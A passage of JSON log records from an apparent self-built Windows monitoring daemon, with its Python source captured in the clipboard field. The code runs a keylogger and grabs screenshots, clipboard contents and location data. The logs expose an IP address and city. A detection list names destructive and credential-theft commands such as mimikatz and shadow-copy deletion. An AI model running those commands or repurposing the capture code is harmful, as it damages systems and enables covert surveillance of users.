(Atomic Write)\r\n        temp_enc_file_path = os.path.join(encrypted_path, f\".{encrypted_filename}.tmp\")\r\n        try:\r\n            with tempfile.NamedTemporaryFile(mode='wb', delete=False, dir=encrypted_path) as temp_f: # mode 'wb' for binary data\r\n                temp_f.write(encrypted_log_data)\r\n            shutil.move(temp_f.name, full_encrypted_filepath)\r\n            logger.info(f\"Encrypted log saved to: {full_encrypted_filepath}\")\r\n        except Exception as e:\r\n            logger.error(f\"Failed to save encrypted log atomically: {e}\", exc_info=True, extra={\"file_path\": full_encrypted_filepath})\r\n            session_log[\"alerts\"].append(f\"Failed to save encrypted log: {e}\")\r\n            if os.path.exists(temp_enc_file_path):\r\n                os.remove(temp_enc_file_path)\r\n            return session_log # Critical failure, return\r\n\r\n\r\n        # 5. Hash the encrypted file content (for the blockchain ledger)\r\n        encrypted_file_hash = hash_file(full_encrypted_filepath)\r\n        if not encrypted_file_hash:\r\n            logger.error(\"Failed to hash encrypted log file. Ledger will not be updated with this log.\", extra={\"file_path\": full_encrypted_filepath})\r\n            session_log[\"alerts\"].append(\"Failed to hash encrypted log file. Ledger not updated.\")\r\n            return session_log\r\n\r\n        # 6. Update the blockchain-style hash ledger with the encrypted file's hash\r\n        try:\r\n            ledger: list[dict] = []\r\n            if os.path.exists(hash_ledger_path):\r\n                try:\r\n                    with open(hash_ledger_path, \"r\", encoding='utf-8') as f:\r\n                        ledger = json.load(f)\r\n                    # Convert legacy format if needed (list of hashes -> list of dicts)\r\n                    if ledger and isinstance(ledger[0], str):\r\n                        logger.info(\"Converting legacy hash ledger format to new dict format.\")\r\n                        converted_ledger = []\r\n                        prev_h = \"0\" * 64\r\n                        for h in ledger:\r\n                            converted_ledger.append({\r\n                                \"timestamp\": datetime.now(timezone.utc).isoformat(), # Use current time for legacy entries\r\n                                \"encrypted_file_hash\": h,\r\n                                \"previous_encrypted_file_hash\": prev_h,\r\n                                \"chained_hash\": hash_text(h + prev_h),\r\n                                \"encrypted_filepath\": \"legacy_path_unknown\"\r\n                            })\r\n                            prev_h = h\r\n                        ledger = converted_ledger\r\n                        logger.info(\"Legacy hash ledger converted successfully.\")\r\n                except json.JSONDecodeError:\r\n                    logger.warning(\"Existing hash ledger file is corrupt. Starting with empty ledger.\", extra={\"file_path\": hash_ledger_path})\r\n                    ledger = []\r\n                except Exception as e:\r\n                    logger.error(f\"Error loading/converting hash ledger: {e}. Starting with empty ledger.\", exc_info=True, extra={\"file_path\": hash_ledger_path})\r\n                    ledger = [] # Start fresh on unexpected error\r\n\r\n            # Determine previous_encrypted_file_hash robustly\r\n            previous_encrypted_file_hash = \"0\" * 64\r\n            if ledger:\r\n                last_entry = ledger[-1]\r\n                if isinstance(last_entry, dict) and \"encrypted_file_hash\" in last_entry:\r\n                    previous_encrypted_file_hash = last_entry[\"encrypted_file_hash\"]\r\n                else:\r\n                    logger.warning(\"Last entry in hash ledger is malformed or missing 'encrypted_file_hash'. Using default previous hash ('0'*64).\", extra={\"last_ledger_entry\": str(last_entry)}) # Convert last_entry to str to avoid issues if it's complex/non-serializable\r\n            \r\n            chained_hash_input = encrypted_file_hash + previous_encrypted_file_hash\r\n            chained_hash = hash_text(chained_hash_input)\r\n\r\n            ledger_entry = {\r\n                \"timestamp\": current_time.isoformat(),\r\n                \"encrypted_file_hash\": encrypted_file_hash,\r\n                \"previous_encrypted_file_hash\": previous_encrypted_file_hash,\r\n                \"chained_hash\": chained_hash,\r\n                \"encrypted_filepath\": full_encrypted_filepath\r\n            }\r\n\r\n            ledger.append(ledger_entry)\r\n\r\n            # Save the updated ledger (Atomic Write)\r\n            temp_ledger_path = os.path.join(base_path, \"hash_ledger_temp.json\")\r\n            try:\r\n                with tempfile.NamedTemporaryFile(mode='w', delete=False, dir=base_path, encoding='utf-8') as temp_f:\r\n                    json.dump(ledger, temp_f, indent=4)\r\n                shutil.move(temp_f.name, hash_ledger_path)\r\n                logger.info(\"Blockchain-style hash ledger updated with encrypted log hash.\")\r\n            except Exception as e:\r\n                logger.error(f\"Atomic write failed for hash ledger: {e}\", exc_info=True, extra={\"temp_path\": temp_ledger_path, \"target_path\": hash_ledger_path})\r\n                session_log[\"alerts\"].append(f\"Failed to update hash ledger atomically: {e}\")\r\n                if os.path.exists(temp_f.name):\r\n                    os.remove(temp_f.name)\r\n                # Fallback: try non-atomic write (less safe)\r\n                try:\r\n                    with open(hash_ledger_path, \"w\", encoding='utf-8') as f:\r\n                        json.dump(ledger, f, indent=4)\r\n                    logger.warning(\"Hash ledger updated with non-atomic write due to previous error.\", extra={\"target_path\": hash_ledger_path})\r\n                except Exception as fallback_e:\r\n                    logger.error(f\"Failed to write hash ledger even with fallback: {fallback_e}\", exc_info=True, extra={\"target_path\": hash_ledger_path})\r\n                    session_log[\"alerts\"].append(f\"CRITICAL: Failed to write hash ledger even with fallback: {fallback_e}\")\r\n\r\n\r\n            # 7. Update Merkle Root\r\n            hash_list_for_merkle = [entry[\"encrypted_file_hash\"] for entry in ledger if \"encrypted_file_hash\" in entry]\r\n            merkle_root = build_merkle_tree(hash_list_for_merkle)\r\n\r\n            if merkle_root:\r\n                # Save the Merkle root (Atomic Write)\r\n                temp_merkle_path = os.path.join(base_path, \"merkle_root_temp.txt\")\r\n                try:\r\n                    with tempfile.NamedTemporaryFile(mode='w', delete=False, dir=base_path, encoding='utf-8') as temp_f_merkle:\r\n                        temp_f_merkle.write(merkle_root)\r\n                    shutil.move(temp_f_merkle.name, merkle_root_path)\r\n                    logger.info(\"Merkle root saved (based on encrypted file hashes).\")\r\n                except Exception as e:\r\n                    logger.error(f\"Atomic write failed for Merkle root: {e}\", exc_info=True, extra={\"temp_path\": temp_merkle_path, \"target_path\": merkle_root_path})\r\n                    session_log[\"alerts\"].append(f\"Failed to save Merkle root atomically: {e}\")\r\n                    if os.path.exists(temp_f_merkle.name):\r\n                        os.remove(temp_f_merkle.name)\r\n                    # Fallback\r\n                    try:\r\n                        with open(merkle_root_path, \"w\", encoding='utf-8') as f:\r\n                            f.write(merkle_root)\r\n                        logger.warning(\"Merkle root updated with non-atomic write due to previous error.\", extra={\"target_path\": merkle_root_path})\r\n                    except Exception as fallback_e:\r\n                        logger.error(f\"Failed to write Merkle root even with fallback: {fallback_e}\", exc_info=True, extra={\"target_path\": merkle_root_path})\r\n                        session_log[\"alerts\"].append(f\"CRITICAL: Failed to write Merkle root even with fallback: {fallback_e}\")\r\n            else:\r\n                logger.warning(\"Merkle root could not be built (no hashes).\")\r\n\r\n\r\n        except Exception as e:\r\n            logger.error(f\"Failed to update hash ledger or Merkle root: {e}\", exc_info=True)\r\n            session_log[\"alerts\"].append(f\"Failed to update hash ledger or Merkle root: {e}\")\r\n\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Encryption or encrypted file save error: {e}\")\r\n        logger.error(f\"Encryption or encrypted file save error: {e}\", exc_info=True)\r\n\r\n    return session_log\r\n\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    logger.info(\"Starting Snakey in daemon mode...\")\r\n\r\n    # Start keylogger in a separate, persistent daemon thread\r\n    keylogger_thread = threading.Thread(target=keylogger_thread_func, daemon=True)\r\n    keylogger_thread.start()\r\n    logger.info(\"Keylogger thread initialized.\")\r\n\r\n    # Initial check for stop file in case it exists from a previous run\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        logger.info(\"Found existing 'stop_snakey.txt'. Removing it to start cleanly.\")\r\n        try:\r\n            os.remove(stop_file_path)\r\n        except Exception as e:\r\n            logger.error(f\"Failed to remove existing stop file: {e}\", exc_info=True)\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            logger.info(\"Snakey terminated by stop_snakey.txt file.\")\r\n            # Gracefully stop keylogger thread\r\n            if KEYLOGGER_LISTENER:\r\n                logger.info(\"Stopping keylogger listener.\")\r\n                KEYLOGGER_LISTENER.stop()\r\n            break # Exit main loop\r\n\r\n        try:\r\n            session_log = collect_full_session() # Gathers all data, encrypts, updates ledger\r\n\r\n            # Send data to Elasticsearch (if connected)\r\n            send_to_elasticsearch(session_log)\r\n\r\n            # Save data to local JSON log file\r\n            save_session_to_json(session_log, json_log_path)\r\n\r\n            # Log to Wazuh-compatible file\r\n            log_to_wazuh_file(session_log)\r\n\r\n        except Exception as e:\r\n            logger.critical(f\"An unhandled error occurred in the main daemon loop: {e}\", exc_info=True)\r\n            # No `extra` here, as this is the top-level handler\r\n            session_log[\"alerts\"].append(f\"CRITICAL: Unhandled error in main loop: {e}\") # Add to log if possible\r\n\r\n        # Sleep for the configured interval\r\n        logger.info(f\"Sleeping for {config['time_sleep_seconds']} seconds before next collection at {datetime.now(timezone.utc).isoformat()}...\")\r\n        time.sleep(config['time_sleep_seconds'])\r\n\r\n    logger.info(\"Snakey daemon has stopped.\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Access from known VPN/proxy IP: 89.214.145.78", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'format c:')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'del /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'rmdir /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net user')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net localgroup administrators')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'taskkill /f /im')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'schtasks /create')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'reg delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mimikatz')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'certutil -urlcache -f -split')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wmic shadowcopy delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'vssadmin delete shadows')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'powershell -nop -w hidden -c')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'invoke-expression')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'set-mppreference -disablerealtimemonitoring $true')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bcdedit /set {current} safeboot network')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mshta.exe http')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bitsadmin /transfer')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wevtutil cl system')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'cipher /w')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'sdelete -z')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (795 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "7bc953bbeac424b0f7d619989809cc46fb5a20586088b9b928a23e5c1b18d547", "screenshot_hash": "925ab0822c4dfd4462cd3bfa8625900ab2110bb12995c85fc7c6407066af63a3", "_raw_log_hash": "15ad9d5c4f0f5180bd3f244f403bb7dbe063caad9f3ac7f2ddb7211a87a73f82"}
{"timestamp": "2025-06-11T17:13:15.363944+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nimport sys\r\nimport threading\r\nimport shutil\r\nimport traceback\r\nimport logging\r\nfrom logging.handlers import RotatingFileHandler, TimedRotatingFileHandler\r\nfrom datetime import datetime, timedelta, timezone\r\nfrom requests import get as requests_get, post as requests_post # Renamed to avoid conflict with `get` from `requests`\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests # Still needed for general requests like ipinfo.io\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException, TransportError\r\nimport ssl # Not directly used for client, but good to have\r\nimport tempfile # For atomic writes\r\n\r\n\r\n# === Configuration Loading ===\r\n# Default configuration values\r\nDEFAULT_CONFIG = {\r\n    \"base_path\": \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\",\r\n    \"known_countries\": [\"Portugal\"], # Example country for testing\r\n    \"known_vpn_ips\": [\"89.214.145.78\", \"123.45.67.89\"], # Example VPN IPs\r\n    \"elastic_host\": \"localhost\",\r\n    \"elastic_port\": 9200,\r\n    \"log_level\": \"INFO\", # DEBUG, INFO, WARNING, ERROR, CRITICAL\r\n    \"time_sleep_seconds\": 3, # Main daemon loop sleep interval\r\n    \"min_free_disk_mb\": 100, # Minimum free disk space to operate\r\n    \"vt_api_key\": None, # Should be loaded from ENV\r\n    \"elastic_user\": None, # Should be loaded from ENV\r\n    \"elastic_password\": None # Should be loaded from ENV\r\n}\r\n\r\n# --- Paths derived from config ---\r\n# These will be set after config is loaded\r\nconfig = {} # Placeholder, will be populated by load_config\r\n\r\n# --- Global Keylogger Variables ---\r\nKEYLOGGER_KEYS = []\r\nKEYLOGGER_LISTENER = None # Will hold the pynput Listener instance\r\nKEYLOGGER_STOP_EVENT = threading.Event() # To signal the keylogger thread to stop\r\n\r\n# === Logger Setup (using Python's logging module) ===\r\n# This needs to be set up early before any `logger.info` calls\r\nlogger = logging.getLogger('snakey_daemon')\r\n\r\nclass JsonFormatter(logging.Formatter):\r\n    \"\"\"Custom JSON formatter for structured logs.\"\"\"\r\n    def format(self, record):\r\n        log_record = {\r\n            \"timestamp\": datetime.fromtimestamp(record.created, tz=timezone.utc).isoformat(),\r\n            \"level\": record.levelname,\r\n            \"message\": record.getMessage(),\r\n            \"logger_name\": record.name,\r\n        }\r\n        if record.exc_info:\r\n            log_record[\"exception\"] = self.formatException(record.exc_info)\r\n        if record.funcName:\r\n            log_record[\"function\"] = record.funcName\r\n        if record.lineno:\r\n            log_record[\"line\"] = record.lineno\r\n        if record.pathname:\r\n            log_record[\"file\"] = record.pathname\r\n        \r\n        # Add any extra dictionary fields passed to the logger via the 'extra' keyword\r\n        if hasattr(record, 'extra') and isinstance(record.extra, dict):\r\n            # The 'extra' dictionary contains the keys directly, so just update\r\n            log_record.update(record.extra)\r\n\r\n        return json.dumps(log_record, default=str) # default=str handles datetime, etc.\r\n\r\ndef setup_logging(log_level_str, log_file_path):\r\n    \"\"\"Configures the main logger for the daemon.\"\"\"\r\n    try:\r\n        logger.setLevel(getattr(logging, log_level_str.upper()))\r\n    except AttributeError:\r\n        logger.setLevel(logging.INFO) # Default to INFO if level is invalid\r\n        logger.warning(f\"Invalid SNAKEY_LOG_LEVEL '{log_level_str}'. Defaulting to INFO.\")\r\n\r\n    # Prevent adding handlers multiple times if setup_logging is called more than once\r\n    if not logger.handlers:\r\n        # File Handler with Time-based Rotation (daily)\r\n        file_handler = TimedRotatingFileHandler(log_file_path,\r\n                                                when=\"midnight\",\r\n                                                interval=1, # Rotate daily\r\n                                                backupCount=5) # Keep up to 5 rotated log files\r\n        file_handler.setLevel(logging.DEBUG) # Log all debug messages to file\r\n        file_handler.setFormatter(JsonFormatter())\r\n        logger.addHandler(file_handler)\r\n\r\n        # Console Handler\r\n        console_handler = logging.StreamHandler(sys.stdout)\r\n        console_handler.setLevel(logging.INFO) # Only INFO and above to console\r\n        console_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')\r\n        console_handler.setFormatter(console_formatter)\r\n        logger.addHandler(console_handler)\r\n\r\n# Global exception handler to log any unhandled exceptions\r\ndef handle_unhandled_exception(exc_type, exc_value, exc_traceback):\r\n    if issubclass(exc_type, KeyboardInterrupt):\r\n        # Don't log KeyboardInterrupt, let default handler deal with it\r\n        sys.__excepthook__(exc_type, exc_value, exc_traceback)\r\n        return\r\n    logger.critical(\"Unhandled exception caught!\", exc_info=(exc_type, exc_value, exc_traceback))\r\n\r\nsys.excepthook = handle_unhandled_exception\r\n\r\ndef load_config(config_file_path: str) -> dict:\r\n    \"\"\"Loads configuration from a JSON file and environment variables.\"\"\"\r\n    loaded_config = DEFAULT_CONFIG.copy()\r\n\r\n    if os.path.exists(config_file_path):\r\n        try:\r\n            with open(config_file_path, \"r\", encoding='utf-8') as f:\r\n                file_config = json.load(f)\r\n                loaded_config.update(file_config)\r\n            logger.info(f\"Configuration loaded from {config_file_path}\")\r\n        except json.JSONDecodeError:\r\n            logger.error(f\"Error decoding config file {config_file_path}. Using default values.\")\r\n        except IOError as e:\r\n            logger.error(f\"Error reading config file {config_file_path}: {e}. Using default values.\")\r\n        except Exception as e:\r\n            logger.critical(f\"Unexpected error parsing config file: {e}\", exc_info=True)\r\n            sys.exit(1) # Critical error, exit\r\n\r\n    # Override with Environment Variables for sensitive info (best practice)\r\n    loaded_config[\"vt_api_key\"] = os.getenv(\"SNAKEY_VT_API_KEY\", loaded_config[\"vt_api_key\"])\r\n    loaded_config[\"elastic_user\"] = os.getenv(\"SNAKEY_ELASTIC_USER\", loaded_config[\"elastic_user\"])\r\n    loaded_config[\"elastic_password\"] = os.getenv(\"SNAKEY_ELASTIC_PASSWORD\", loaded_config[\"elastic_password\"])\r\n    loaded_config[\"log_level\"] = os.getenv(\"SNAKEY_LOG_LEVEL\", loaded_config[\"log_level\"]).upper()\r\n\r\n    return loaded_config\r\n\r\n# === Global Variables (Initialized after config loading) ===\r\nconfig_file = os.path.join(DEFAULT_CONFIG[\"base_path\"], \"snakey_config.json\")\r\nconfig = load_config(config_file)\r\n\r\n# Now define paths and settings using the loaded config\r\nbase_path = config[\"base_path\"]\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True) # Ensure directory exists\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon.log\") # Changed name to avoid conflict with existing (error) log\r\n\r\nscreenshot_information = \"screenshot.png\"  # Temporary screenshot file\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = set(config[\"known_countries\"]) # Use set for faster lookups\r\nKNOWN_VPN_IPS = set(config[\"known_vpn_ips\"]) # Use set for faster lookups\r\nMIN_FREE_DISK_MB = config[\"min_free_disk_mb\"]\r\n\r\n# --- VirusTotal API Endpoints (Global Constants) ---\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\n\r\n\r\n# Sensitive Command Detection Configuration\r\nSENSITIVE_CMD_COMMANDS = [\r\n    \"format c:\", \"del /s /q\", \"rmdir /s /q\", \"net user\", \"net localgroup administrators\",\r\n    \"taskkill /f /im\", \"schtasks /create\", \"reg delete\", \"mimikatz\",\r\n    \"certutil -urlcache -f -split\", \"wmic shadowcopy delete\", \"vssadmin delete shadows\",\r\n    \"powershell -nop -w hidden -c\", \"invoke-expression\", \"set-mppreference -disablerealtimemonitoring $true\",\r\n    \"bcdedit /set {current} safeboot network\", \"mshta.exe http\", \"bitsadmin /transfer\",\r\n    \"wevtutil cl system\", \"cipher /w\", \"sdelete -z\",\r\n]\r\n\r\n# === Setup Logging (now that config is loaded) ===\r\nsetup_logging(config[\"log_level\"], daemon_log_file)\r\n\r\n\r\n# === Encryption Key Loading ===\r\nfernet: Fernet = None # Type hint\r\nif not os.path.exists(key_path):\r\n    logger.critical(\"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    sys.exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\n    logger.info(\"Encryption key loaded successfully.\")\r\nexcept Exception as e:\r\n    logger.critical(f\"Failed to load encryption key: {e}. Exiting.\", exc_info=True)\r\n    sys.exit(1)\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = config[\"elastic_host\"]\r\nELASTIC_PORT = config[\"elastic_port\"]\r\nELASTIC_USER = config[\"elastic_user\"]\r\nELASTIC_PASSWORD = config[\"elastic_password\"]\r\n\r\nes_client: Elasticsearch = None # Type hint\r\n\r\n# Basic pre-check before initializing the full ES client\r\nes_precheck_successful = False\r\nlogger.info(\"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\nif not ELASTIC_USER or not ELASTIC_PASSWORD:\r\n    logger.critical(\"Elasticsearch username or password not set (check SNAKEY_ELASTIC_USER/SNAKEY_ELASTIC_PASSWORD environment variables or config file). Elasticsearch client will not be initialized.\")\r\nelse:\r\n    try:\r\n        response = requests_get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n                                verify=False, timeout=10, stream=True)\r\n        logger.debug(f\"Basic requests.get status: {response.status_code}\")\r\n        # Read a byte to force connection establishment, then close to prevent hanging\r\n        try:\r\n            response.raw.read(1)\r\n        except Exception as read_e:\r\n            logger.warning(f\"Error reading from raw response during pre-check (might be expected for empty response): {read_e}\", extra={\"error_type\": \"requests_raw_read_error\"})\r\n        response.close()\r\n        if response.status_code == 200:\r\n            logger.info(\"Basic requests.get pre-check successful (status 200).\")\r\n            es_precheck_successful = True\r\n        else:\r\n            logger.warning(\r\n                f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\",\r\n                extra={\"http_status\": response.status_code, \"response_text\": response.text})\r\n\r\n    except requests.exceptions.ConnectionError as e:\r\n        logger.error(f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\", exc_info=True, extra={\"error_type\": \"requests_connection_error\"})\r\n    except requests.exceptions.Timeout:\r\n        logger.error(\"requests.Timeout during pre-check: Connection timed out.\", exc_info=True, extra={\"error_type\": \"requests_timeout\"})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\", exc_info=True, extra={\"error_type\": \"requests_request_error\"})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during basic requests pre-check: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_precheck_error\"})\r\n\r\n\r\nif es_precheck_successful:\r\n    try:\r\n        es_client = Elasticsearch(\r\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n            verify_certs=False,  # WARNING: Disable for testing, enable for production!\r\n            ssl_show_warn=False, # Suppress SSL warnings in logs from elasticsearch client\r\n            request_timeout=30 # Increased timeout for client initialization\r\n        )\r\n        # Attempt to ping to confirm full connection\r\n        if es_client.ping():\r\n            logger.info(\"Elasticsearch client initialized and connected successfully.\")\r\n        else:\r\n            logger.error(\"Elasticsearch client initialized but failed to ping the cluster. Check credentials.\", extra={\"error_type\": \"es_ping_failed\"})\r\n            es_client = None\r\n    except ConnectionError as e:\r\n        logger.error(f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\", exc_info=True, extra={\"error_type\": \"es_connection_error\"})\r\n        es_client = None\r\n    except AuthenticationException as e:\r\n        logger.error(f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD carefully.\", exc_info=True, extra={\"error_type\": \"es_auth_error\"})\r\n        es_client = None\r\n    except TransportError as e:\r\n        logger.error(f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\", exc_info=True, extra={\"error_type\": \"es_transport_error\", \"status_code\": e.status_code})\r\n        es_client = None\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during Elasticsearch client initialization: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_es_init_error\"})\r\n        es_client = None\r\nelse:\r\n    logger.warning(\"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\r\n\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath: str) -> str | None:\r\n    \"\"\"Calculates the SHA256 hash of a file.\"\"\"\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except FileNotFoundError:\r\n        logger.error(f\"File not found for hashing: {filepath}\", extra={\"file_path\": filepath})\r\n        return None\r\n    except Exception as e:\r\n        logger.error(f\"Hashing failed for {filepath}: {e}\", exc_info=True, extra={\"file_path\": filepath})\r\n        return None\r\n\r\n\r\ndef hash_text(text: str) -> str:\r\n    \"\"\"Calculates the SHA256 hash of a given string.\"\"\"\r\n    return hashlib.sha256(text.encode('utf-8')).hexdigest()\r\n\r\n\r\ndef build_merkle_tree(hashes: list[str]) -> str | None:\r\n    \"\"\"Builds a Merkle tree from a list of hashes and returns the Merkle root.\"\"\"\r\n    if not hashes:\r\n        return None\r\n    hashes = list(hashes) # Make a mutable copy\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])  # Duplicate last hash if odd number\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\n\r\ndef vt_lookup_url(url: str) -> dict:\r\n    \"\"\"Performs a VirusTotal URL lookup.\"\"\"\r\n    try:\r\n        if not config.get(\"vt_api_key\"): # Use .get() for safer access\r\n            logger.warning(\"VirusTotal API key not configured. Skipping URL lookup.\", extra={\"url\": url})\r\n            return {}\r\n\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests_get(f\"{VT_URL_LOOKUP}{url_id}\", headers={\"x-apikey\": config[\"vt_api_key\"]}, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            logger.warning(f\"VirusTotal URL lookup failed (404 Not Found) for hash {url_id}. URL likely not previously analyzed by VT.\", extra={\"url_hash\": url_id})\r\n        else:\r\n            logger.warning(f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\", extra={\"url\": url, \"status_code\": response.status_code, \"response_text\": response.text})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"VT URL lookup failed: {e}\", exc_info=True, extra={\"url\": url})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during VT URL lookup: {e}\", exc_info=True, extra={\"url\": url})\r\n    return {}\r\n\r\n\r\ndef vt_lookup_file(file_path: str) -> dict:\r\n    \"\"\"Performs a VirusTotal file lookup.\"\"\"\r\n    try:\r\n        if not config.get(\"vt_api_key\"): # Use .get() for safer access\r\n            logger.warning(\"VirusTotal API key not configured. Skipping File lookup.\", extra={\"file_path\": file_path})\r\n            return {}\r\n\r\n        if not os.path.exists(file_path):\r\n            logger.error(f\"File not found for VT lookup: {file_path}\", extra={\"file_path\": file_path})\r\n            return {}\r\n\r\n        file_hash = hash_file(file_path)\r\n        if not file_hash:\r\n            return {}\r\n\r\n        response = requests_get(f\"{VT_FILE_LOOKUP}{file_hash}\", headers={\"x-apikey\": config[\"vt_api_key\"]}, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            logger.warning(f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\", extra={\"file_hash\": file_hash, \"file_path\": file_path})\r\n        else:\r\n            logger.warning(f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\", extra={\"file_path\": file_path, \"status_code\": response.status_code, \"response_text\": response.text})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"VT File lookup failed: {e}\", exc_info=True, extra={\"file_path\": file_path})\r\n    except Exception as e:\r\n        